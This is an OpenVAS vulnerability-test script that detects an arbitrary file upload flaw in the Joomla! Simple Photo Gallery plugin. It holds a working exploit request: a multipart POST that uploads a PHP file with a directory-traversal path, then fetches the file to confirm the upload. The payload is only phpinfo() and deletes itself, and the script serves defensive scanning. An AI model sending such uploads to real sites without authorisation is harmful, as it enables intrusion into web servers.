###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_simplephotogallery_file_upload_vuln.nasl 6333 2017-06-14 10:00:49Z teissa $
#
# Joomla! Simple Photo Gallery Arbitrary File Upload Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:joomla:joomla";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805155");
  script_version("$Revision: 6333 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2017-06-14 12:00:49 +0200 (Wed, 14 Jun 2017) $");
  script_tag(name:"creation_date", value:"2015-03-17 18:20:26 +0530 (Tue, 17 Mar 2015)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_name("Joomla! Simple Photo Gallery Arbitrary File Upload Vulnerability");

  script_tag(name: "summary" , value:"The host is installed with Joomla! Simple
  Photo Gallery and is prone to arbitrary file upload vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP POST request
  and check whether it is is able to upload file or not.");

  script_tag(name:"insight", value:"Flaw is due to the plugin failed to
  restrict access to certain files.");

  script_tag(name:"impact", value:"Successful exploitation will allow an
  unauthenticated remote attacker to upload files in an affected site.

  Impact Level: Application");

  script_tag(name: "affected" , value:"Joomla! Simple Photo Gallery
  version 1.1 and prior.");

  script_tag(name:"solution", value:"No solution or patch was made available
  for at least one year since disclosure of this vulnerability. Likely none will
  be provided anymore. General solution options are to upgrade to a newer release,
  disable respective features, remove the product or replace the product by another
  one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/36373");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_mandatory_keys("joomla/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Variable Initialization
http_port = 0;
dir = "";
url = "";

## Get HTTP Port
if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

## Get Joomla Location
if(!dir = get_app_location(cpe:CPE, port:http_port)){
  exit(0);
}

## Plugin URL
url = dir + '/administrator/components/com_simplephotogallery/lib/uploadFile.php';
wpReq = http_get(item: url,  port:http_port);
wpRes = http_keepalive_send_recv(port:http_port, data:wpReq, bodyonly:FALSE);

## Confirm Plugin
if(wpRes && wpRes =~ "HTTP/1.. 200 OK")
{
  fileName = 'OpenVAS_' + rand();

  postData = string('------------agdOsaQ7KQXNnu6QsXxxVq\r\n',
                    'Content-Disposition: form-data; name="uploadfile"; filename="', fileName, '.php"\r\n',
                    'Content-Type: application/octet-stream\r\n\r\n',
                    '<?php phpinfo(); $fileName = glob("', fileName, '*.php")[0]; unlink($fileName); ?>\r\n\r\n',
                    '------------agdOsaQ7KQXNnu6QsXxxVq\r\n',
                    'Content-Disposition: form-data; name="jpath"\r\n\r\n',
                    '..%2F..%2F..%2F..%2F\r\n',
                    '------------agdOsaQ7KQXNnu6QsXxxVq\r\n',
                    'Content-Disposition: form-data; name="Submit"\r\n\r\n',
                    'Pwn!\r\n', '------------agdOsaQ7KQXNnu6QsXxxVq--');

  sndReq = string("POST ", url, " HTTP/1.1\r\n",
                  "Host: ", get_host_name(), "\r\n",
                  "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
                  "Content-Length: ", strlen(postData), "\r\n",
                  "Content-Type: multipart/form-data; boundary=----------agdOsaQ7KQXNnu6QsXxxVq\r\n\r\n",
                  postData, "\r\n");

  ## Send request and receive the response
  rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);

  ## Checking File has been created
  if("OpenVAS_" >< rcvRes && rcvRes =~ "HTTP/1.. 200 OK")
  {
    uploadedFile = eregmatch(pattern:'OpenVAS_(.*__.*)php<br', string:rcvRes);
    uploadedFile = "OpenVAS_"+uploadedFile[1]+"php";

    ## Uploaded file URL
    url = dir + "/" + uploadedFile;

    ## Confirm the Exploit and Deleting uploaded file
    if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
       pattern:">phpinfo\(\)<", extra_check:">System"))
    {
      ## Confirm Deletion
      if(http_vuln_check(port:http_port, url:url,
         check_header:FALSE, pattern:"HTTP/1.. 200 OK"))
      {
        report = "\nUnable to Delete the uploaded File at " + url + "\n";
      }

      if(report){
        security_message(data:report, port:http_port);
      } else {
        security_message(port:http_port);
      }
      exit(0);
    }
  }
}
